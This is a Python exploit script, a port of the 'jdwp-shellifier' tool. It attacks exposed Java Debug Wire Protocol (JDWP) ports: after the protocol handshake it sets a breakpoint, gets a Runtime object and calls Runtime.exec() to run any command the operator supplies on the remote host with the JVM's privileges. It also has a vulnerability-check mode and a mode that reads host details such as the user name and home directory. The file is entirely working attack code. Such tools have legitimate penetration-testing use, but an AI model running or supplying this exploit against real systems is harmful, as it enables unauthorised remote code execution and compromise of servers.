#!/usr/bin/python3
################################################################################
#
# Universal JDWP shellifier
#
# @_hugsy_
#
# And special cheers to @lanjelot
# https://github.com/IOActive/jdwp-shellifier

import socket
import time
import sys
import struct
import urllib.request, urllib.parse, urllib.error
import argparse
import os
import traceback    #show error (discripted)


################################################################################
#
# JDWP protocol variables
#
HANDSHAKE                 = b"JDWP-Handshake"

REQUEST_PACKET_TYPE       = 0x00
REPLY_PACKET_TYPE         = 0x80

# Command signatures
VERSION_SIG               = (1, 1)
CLASSESBYSIGNATURE_SIG    = (1, 2)
ALLCLASSES_SIG            = (1, 3)
ALLTHREADS_SIG            = (1, 4)
IDSIZES_SIG               = (1, 7)
CREATESTRING_SIG          = (1, 11)
SUSPENDVM_SIG             = (1, 8)
RESUMEVM_SIG              = (1, 9)
SIGNATURE_SIG             = (2, 1)
FIELDS_SIG                = (2, 4)
METHODS_SIG               = (2, 5)
GETVALUES_SIG             = (2, 6)
CLASSOBJECT_SIG           = (2, 11)
INVOKESTATICMETHOD_SIG    = (3, 3)
REFERENCETYPE_SIG         = (9, 1)
INVOKEMETHOD_SIG          = (9, 6)
STRINGVALUE_SIG           = (10, 1)
THREADNAME_SIG            = (11, 1)
THREADSUSPEND_SIG         = (11, 2)
THREADRESUME_SIG          = (11, 3)
THREADSTATUS_SIG          = (11, 4)
EVENTSET_SIG              = (15, 1)
EVENTCLEAR_SIG            = (15, 2)
EVENTCLEARALL_SIG         = (15, 3)

# Other codes
MODKIND_COUNT             = 1
MODKIND_THREADONLY        = 2
MODKIND_CLASSMATCH        = 5
MODKIND_LOCATIONONLY      = 7
EVENT_BREAKPOINT          = 2
SUSPEND_EVENTTHREAD       = 1
SUSPEND_ALL               = 2
NOT_IMPLEMENTED           = 99
VM_DEAD                   = 112
INVOKE_SINGLE_THREADED    = 2
TAG_OBJECT                = 76
TAG_STRING                = 115
TYPE_CLASS                = 1


################################################################################
#
# JDWP client class
#
class JDWPClient:

    def __init__(self, host, port=8000):
        self.host = host
        self.port = port
        self.methods = {}
        self.fields = {}
        self.id = 0x01
        self.check = False
        return

    def create_packet(self, cmdsig, data=b""):
        flags = 0x00
        cmdset, cmd = cmdsig
        pktlen = len(data) + 11
        pkt = struct.pack(">IIccc", pktlen, self.id, bytes([flags]), bytes([cmdset]), bytes([cmd]))
        pkt+= data
        self.id += 2
        return pkt

    def read_reply(self):
        header = self.socket.recv(11)
        pktlen, id, flags, errcode = struct.unpack(">IIcH", header)

        if flags == bytes([REPLY_PACKET_TYPE]):
            if errcode :
                raise Exception("Received errcode %d" % errcode)

        buf = b""
        while len(buf) + 11 < pktlen:
            data = self.socket.recv(1024)
            if len(data):
                buf += data
            else:
                time.sleep(1)
        return buf

    def parse_entries(self, buf, formats, explicit=True):
        entries = []
        index = 0


        if explicit:
            nb_entries = struct.unpack(">I", buf[:4])[0]
            buf = buf[4:]
        else:
            nb_entries = 1

        for i in range(nb_entries):
            data = {}
            for fmt, name in formats:
                if fmt == b"L" or fmt == 8:
                    data[name] = int(struct.unpack(">Q",buf[index:index+8]) [0])
                    index += 8
                elif fmt == b"I" or fmt == 4:
                    data[name] = int(struct.unpack(">I", buf[index:index+4])[0])
                    index += 4
                elif fmt == b'S':
                    l = struct.unpack(">I", buf[index:index+4])[0]
                    data[name] = buf[index+4:index+4+l]
                    index += 4+l
                elif fmt == b'C':
                    data[name] = ord(struct.unpack(">c", bytes([buf[index]]))[0])
                    index += 1
                elif fmt == b'Z':
                    t = ord(struct.unpack(">c", bytes([buf[index]]))[0])
                    if t == 115:
                        s = self.solve_string(buf[index+1:index+9])
                        data[name] = s
                        index+=9
                    elif t == 73:
                        data[name] = struct.unpack(">I", buf[index+1:index+5])[0]
                        buf = struct.unpack(">I", buf[index+5:index+9])
                        index=0

                else:
                    print("Error")
                    sys.exit(1)

            entries.append( data )

        return entries

    def format(self, fmt, value):
        if fmt == b"L" or fmt == 8:
            return struct.pack(">Q", value)
        elif fmt == b"I" or fmt == 4:
            return struct.pack(">I", value)

        raise Exception("Unknown format")

    def unformat(self, fmt, value):
        if fmt == b"L" or fmt == 8:
            return struct.unpack(">Q", value[:8])[0]
        elif fmt == b"I" or fmt == 4:
            return struct.unpack(">I", value[:4])[0]
        else:
            raise Exception("Unknown format")
        return

    def start(self):
        self.handshake(self.host, self.port)
        if self.check and self.socket is not None:
            print('[+] Target: {}:{} is vulnerable'.format(self.host, self.port))
            return
        
        self.idsizes()
        self.getversion()
        self.allclasses()
        return

    def handshake(self, host, port):
        s = socket.socket()
        try:
            s.connect( (host, port) )
        except socket.error as msg:
            raise Exception("Failed to connect: %s" % msg)

        s.send(HANDSHAKE )
        if s.recv( len(HANDSHAKE) ) != HANDSHAKE:
            raise Exception("Failed to handshake")
        else:
            self.socket = s
        return

    def leave(self):
        self.socket.close()
        return

    def getversion(self):
        self.socket.sendall( self.create_packet(VERSION_SIG) )
        buf = self.read_reply()
        formats = [ (b'S', "description"), (b'I', "jdwpMajor"), (b'I', "jdwpMinor"),
                    (b'S', "vmVersion"), (b'S', "vmName"), ]
        for entry in self.parse_entries(buf, formats, False):
            for name,value  in entry.items():
                setattr(self, name, value)
        return

    @property
    def version(self):
        return "%s - %s" % (self.vmName, self.vmVersion)

    def idsizes(self):
        self.socket.sendall( self.create_packet(IDSIZES_SIG) )
        buf = self.read_reply()
        formats = [ (b"I", "fieldIDSize"), (b"I", "methodIDSize"), (b"I", "objectIDSize"),
                    (b"I", "referenceTypeIDSize"), (b"I", "frameIDSize") ]
        for entry in self.parse_entries(buf, formats, False):
            for name,value  in entry.items():
                setattr(self, name, value)
        return

    def allthreads(self):
        try:
            getattr(self, "threads")
        except :
            self.socket.sendall( self.create_packet(ALLTHREADS_SIG) )
            buf = self.read_reply()
            formats = [ (self.objectIDSize, "threadId")]
            self.threads = self.parse_entries(buf, formats)
        finally:
            return self.threads

    def get_thread_by_name(self, name):
        self.allthreads()
        for t in self.threads:
            threadId = self.format(self.objectIDSize, t["threadId"])
            self.socket.sendall( self.create_packet(THREADNAME_SIG, data=threadId) )
            buf = self.read_reply()
            if len(buf) and name == self.readstring(buf):
                return t
        return None

    def allclasses(self):
        try:
            getattr(self, "classes")
        except:
            self.socket.sendall( self.create_packet(ALLCLASSES_SIG) )
            buf = self.read_reply()
            formats = [ (b'C', b"refTypeTag"),
                        (self.referenceTypeIDSize, b"refTypeId"),
                        (b'S', b"signature"),
                        (b'I', b"status")]
            self.classes = self.parse_entries(buf, formats)

        return self.classes

    def get_class_by_name(self, name):
        for entry in self.classes:
            if entry[b"signature"].lower() == name.lower() :
                return entry
        return None

    def get_methods(self, refTypeId):
        if refTypeId not in self.methods:
            refId = self.format(self.referenceTypeIDSize, refTypeId)
            self.socket.sendall( self.create_packet(METHODS_SIG, data=refId) )
            buf = self.read_reply()
            formats = [ (self.methodIDSize, b"methodId"),
                        (b'S', b"name"),
                        (b'S', b"signature"),
                        (b'I', b"modBits")]
            self.methods[refTypeId] = self.parse_entries(buf, formats)
        return self.methods[refTypeId]

    def get_method_by_name(self, name):
        for refId in list(self.methods.keys()):
            for entry in self.methods[refId]:
                if entry[b"name"].lower() == name.lower() :
                    return entry
        return None

    def getfields(self, refTypeId):
        if refTypeId not in self.fields:
            refId = self.format(self.referenceTypeIDSize, refTypeId)
            self.socket.sendall( self.create_packet(FIELDS_SIG, data=refId) )
            buf = self.read_reply()
            formats = [ (self.fieldIDSize, b"fieldId"),
                        (b'S', "name"),
                        (b'S', "signature"),
                        (b'I', "modbits")]
            self.fields[refTypeId] = self.parse_entries(buf, formats)
        return self.fields[refTypeId]

    def getvalue(self, refTypeId, fieldId):
        data = self.format(self.referenceTypeIDSize, refTypeId)
        data+= struct.pack(">I", 1)
        data+= self.format(self.fieldIDSize, fieldId)
        self.socket.sendall( self.create_packet(GETVALUES_SIG, data=data) )
        buf = self.read_reply()
        formats = [ (b"Z", "value") ]
        field = self.parse_entries(buf, formats)[0]
        return field

    def createstring(self, data):
        buf = self.buildstring(data)
        self.socket.sendall( self.create_packet(CREATESTRING_SIG, data=buf) )
        buf = self.read_reply()
        return self.parse_entries(buf, [(self.objectIDSize, b"objId")], False)

    def buildstring(self, data):
        if isinstance(data,str):
            data = data.encode()
        return struct.pack(">I", len(data)) + data

    def readstring(self, data):
        size = struct.unpack(">I", data[:4])[0]
        return data[4:4+size]

    def suspendvm(self):
        self.socket.sendall( self.create_packet( SUSPENDVM_SIG ) )
        self.read_reply()
        return

    def resumevm(self):
        self.socket.sendall( self.create_packet( RESUMEVM_SIG ) )
        self.read_reply()
        return

    def invokestatic(self, classId, threadId, methId, *args):
        data = self.format(self.referenceTypeIDSize, classId)
        data+= self.format(self.objectIDSize, threadId)
        data+= self.format(self.methodIDSize, methId)
        data+= struct.pack(">I", len(args))
        for arg in args:
            data+= arg
        data+= struct.pack(">I", 0)

        self.socket.sendall( self.create_packet(INVOKESTATICMETHOD_SIG, data=data) )
        buf = self.read_reply()
        return buf

    def invoke(self, objId, threadId, classId, methId, *args):
        data = self.format(self.objectIDSize, objId)
        data+= self.format(self.objectIDSize, threadId)
        data+= self.format(self.referenceTypeIDSize, classId)
        data+= self.format(self.methodIDSize, methId)
        data+= struct.pack(">I", len(args))
        for arg in args:
            data+= arg
        data+= struct.pack(">I", 0)

        self.socket.sendall( self.create_packet(INVOKEMETHOD_SIG, data=data) )
        buf = self.read_reply()
        return buf

    def solve_string(self, objId):
        self.socket.sendall( self.create_packet(STRINGVALUE_SIG, data=objId) )
        buf = self.read_reply()
        if len(buf):
            return self.readstring(buf)
        else:
            return b""

    def query_thread(self, threadId, kind):
        data = self.format(self.objectIDSize, threadId)
        self.socket.sendall( self.create_packet(kind, data=data) )
        buf = self.read_reply()
        return

    def suspend_thread(self, threadId):
        return self.query_thread(threadId, THREADSUSPEND_SIG)

    def status_thread(self, threadId):
        return self.query_thread(threadId, THREADSTATUS_SIG)

    def resume_thread(self, threadId):
        return self.query_thread(threadId, THREADRESUME_SIG)

    def send_event(self, eventCode, *args):
        data = b""
        data+= bytes([eventCode])
        data+= bytes([SUSPEND_ALL])
        data+= struct.pack(">I", len(args))

        for kind, option in args:
            data+= bytes([kind])
            data+= option

        self.socket.sendall( self.create_packet(EVENTSET_SIG, data=data) )
        buf = self.read_reply()
        return struct.unpack(">I", buf)[0]

    def clear_event(self, eventCode, rId):
        data = bytes([eventCode])
        data+= struct.pack(">I", rId)
        self.socket.sendall( self.create_packet(EVENTCLEAR_SIG, data=data) )
        self.read_reply()
        return

    def clear_events(self):
        self.socket.sendall( self.create_packet(EVENTCLEARALL_SIG) )
        self.read_reply()
        return

    def wait_for_event(self):
        buf = self.read_reply()
        return buf

    def parse_event_breakpoint(self, buf, eventId):
        num = struct.unpack(">I", buf[2:6])[0]
        rId = struct.unpack(">I", buf[6:10])[0]
        if rId != eventId:
            return None
        tId = self.unformat(self.objectIDSize, buf[10:10+self.objectIDSize])
        loc = -1 # don't care
        return rId, tId, loc



def runtime_exec(jdwp, args):
    print("[+] Targeting '%s:%d'" % (args.target, args.port))
    print("[+] Reading settings for '%s'" % jdwp.version)

    # 1. get Runtime class reference
    runtimeClass = jdwp.get_class_by_name(b"Ljava/lang/Runtime;")
    if runtimeClass is None:
        print ("[-] Cannot find class Runtime")
        return False
    print("[+] Found Runtime class: id=%x" % runtimeClass[b"refTypeId"])

    # 2. get getRuntime() meth reference
    jdwp.get_methods(runtimeClass[b"refTypeId"])
    getRuntimeMeth = jdwp.get_method_by_name(b"getRuntime")
    if getRuntimeMeth is None:
        print ("[-] Cannot find method Runtime.getRuntime()")
        return False
    print("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth[b"methodId"])

    # 3. setup breakpoint on frequently called method
    c = jdwp.get_class_by_name( args.break_on_class )
    if c is None:
        print("[-] Could not access class '%s'" % args.break_on_class)
        print("[-] It is possible that this class is not used by application")
        print("[-] Test with another one with option `--break-on`")
        return False

    jdwp.get_methods( c[b"refTypeId"] )
    m = jdwp.get_method_by_name( args.break_on_method )
    if m is None:
        print("[-] Could not access method '%s'" % args.break_on)
        return False

    loc = bytes([TYPE_CLASS])
    loc+= jdwp.format( jdwp.referenceTypeIDSize, c[b"refTypeId"] )
    loc+= jdwp.format( jdwp.methodIDSize, m[b"methodId"] )
    loc+= struct.pack(">II", 0, 0)
    data = [ (MODKIND_LOCATIONONLY, loc), ]
    rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
    print("[+] Created break event id=%x" % rId)

    # 4. resume vm and wait for event
    jdwp.resumevm()

    print("[+] Waiting for an event on '%s'" % args.break_on)
    while True:
        buf = jdwp.wait_for_event()
        ret = jdwp.parse_event_breakpoint(buf, rId)
        if ret is not None:
            break

    rId, tId, loc = ret
    print("[+] Received matching event from thread %#x" % tId)

    jdwp.clear_event(EVENT_BREAKPOINT, rId)

    # 5. Now we can execute any code
    if args.cmd:
        runtime_exec_payload(jdwp, tId, runtimeClass[b"refTypeId"], getRuntimeMeth[b"methodId"], args.cmd)
    else:
        # by default, only prints out few system properties
        runtime_exec_info(jdwp, tId)

    jdwp.resumevm()

    print ("[!] Command successfully executed")

    return True


def runtime_exec_info(jdwp, threadId):
    #
    # This function calls java.lang.System.getProperties() and
    # displays OS properties (non-intrusive)
    #
    properties = {b"java.version": b"Java Runtime Environment version",
                  b"java.vendor": b"Java Runtime Environment vendor",
                  b"java.vendor.url": b"Java vendor URL",
                  b"java.home": b"Java installation directory",
                  b"java.vm.specification.version": b"Java Virtual Machine specification version",
                  b"java.vm.specification.vendor": b"Java Virtual Machine specification vendor",
                  b"java.vm.specification.name": b"Java Virtual Machine specification name",
                  b"java.vm.version": b"Java Virtual Machine implementation version",
                  b"java.vm.vendor": b"Java Virtual Machine implementation vendor",
                  b"java.vm.name": b"Java Virtual Machine implementation name",
                  b"java.specification.version": b"Java Runtime Environment specification version",
                  b"java.specification.vendor": b"Java Runtime Environment specification vendor",
                  b"java.specification.name": b"Java Runtime Environment specification name",
                  b"java.class.version": b"Java class format version number",
                  b"java.class.path": b"Java class path",
                  b"java.library.path": b"List of paths to search when loading libraries",
                  b"java.io.tmpdir": b"Default temp file path",
                  b"java.compiler": b"Name of JIT compiler to use",
                  b"java.ext.dirs": b"Path of extension directory or directories",
                  b"os.name": b"Operating system name",
                  b"os.arch": b"Operating system architecture",
                  b"os.version": b"Operating system version",
                  b"file.separator": b"File separator",
                  b"path.separator": b"Path separator",
                  b"user.name": b"User's account name",
                  b"user.home": b"User's home directory",
                  b"user.dir": b"User's current working directory"
                }

    systemClass = jdwp.get_class_by_name(b"Ljava/lang/System;")
    if systemClass is None:
        print ("[-] Cannot find class java.lang.System")
        return False

    jdwp.get_methods(systemClass[b"refTypeId"])
    getPropertyMeth = jdwp.get_method_by_name(b"getProperty")
    if getPropertyMeth is None:
        print ("[-] Cannot find method System.getProperty()")
        return False

    for propStr, propDesc in properties.items():
        propObjIds =  jdwp.createstring(propStr)
        if len(propObjIds) == 0:
            print ("[-] Failed to allocate command")
            return False
        propObjId = propObjIds[0][b"objId"]

        data = [ bytes([TAG_OBJECT]) + jdwp.format(jdwp.objectIDSize, propObjId), ]
        buf = jdwp.invokestatic(systemClass[b"refTypeId"],
                                threadId,
                                getPropertyMeth[b"methodId"],
                                *data)
        if buf[0] != TAG_STRING:
            print("[-] %s: Unexpected returned type: expecting String" % propStr)
        else:
            retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
            res = cli.solve_string(jdwp.format(jdwp.objectIDSize, retId))
            print("[+] Found %s '%s'" % (propDesc, res))

    return True


def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, command):
    #
    # This function will invoke command as a payload, which will be running
    # with JVM privilege on host (intrusive).
    #
    print("[+] Selected payload '%s'" % command)

    # 1. allocating string containing our command to exec()
    cmdObjIds = jdwp.createstring( command )
    if len(cmdObjIds) == 0:
        print ("[-] Failed to allocate command")
        return False
    cmdObjId = cmdObjIds[0][b"objId"]
    print("[+] Command string object created id:%x" % cmdObjId)

    # 2. use context to get Runtime object
    buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
    if buf[0] != TAG_OBJECT:
        print('here1')
        print ("[-] Unexpected returned type: expecting Object")
        return False
    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])

    if rt is None:
        print("[-] Failed to invoke Runtime.getRuntime()")
        return False
    print("[+] Runtime.getRuntime() returned context id:%#x" % rt)

    # 3. find exec() method
    execMeth = jdwp.get_method_by_name(b"exec")
    if execMeth is None:
        print ("[-] Cannot find method Runtime.exec()")
        return False
    print("[+] found Runtime.exec(): id=%x" % execMeth[b"methodId"])

    # 4. call exec() in this context with the alloc-ed string
    data = [ bytes([TAG_OBJECT]) + jdwp.format(jdwp.objectIDSize, cmdObjId) ]
    buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth[b"methodId"], *data)
    if buf[0] != TAG_OBJECT:
        print ("[-] Unexpected returned type: expecting Object")
        return False

    retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
    print("[+] Runtime.exec() successful, retId=%x" % retId)

    return True


def str2fqclass(s):
    i = s.rfind(b'.')
    if i == -1:
        print("Cannot parse path")
        sys.exit(1)

    method = s[i:][1:]
    classname = b'L' + s[:i].replace(b'.', b'/') + b';'
    return classname, method


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Universal exploitation script for JDWP by @_hugsy_",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter )

    parser.add_argument("-check", action="store_true", default=False, help="Check for vulnerability")
    parser.add_argument("-t", "--target", type=str, metavar="IP", help="Remote target IP", required=True)
    parser.add_argument("-p", "--port", type=int, metavar="PORT", default=8000, help="Remote target port")
    parser.add_argument("--break-on", dest="break_on", type=str, metavar="JAVA_METHOD",
                        default="java.lang.String.indexOf", help="Specify full path to method to break on, if does not work, try: java.net.ServerSocket.accept")
    parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND",
                        help="Specify command to execute remotely")

    args = parser.parse_args()
    classname, meth = str2fqclass(args.break_on.encode())
    setattr(args, "break_on_class", classname)
    setattr(args, "break_on_method", meth)

    retcode = 0

    try:
        cli = JDWPClient(args.target, args.port)
        cli.check = args.check
        cli.start()
        if args.check is True:
            exit()
        if runtime_exec(cli, args) == False:
            print ("[-] Exploit failed")
            retcode = 1

    except KeyboardInterrupt:
        print ("[+] Exiting on user's request")

    except Exception as e:
        print(traceback.format_exc())
        retcode = 1
        cli = None

    finally:
        if cli:
            cli.leave()

    sys.exit(retcode)